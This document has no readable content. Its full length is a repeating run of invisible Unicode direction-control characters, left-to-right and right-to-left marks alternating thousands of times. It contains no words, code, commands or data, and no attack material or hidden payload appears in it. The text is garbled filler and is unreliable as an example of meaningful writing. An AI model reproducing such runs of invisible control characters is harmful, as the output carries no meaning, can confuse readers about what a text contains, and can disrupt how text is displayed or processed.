‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎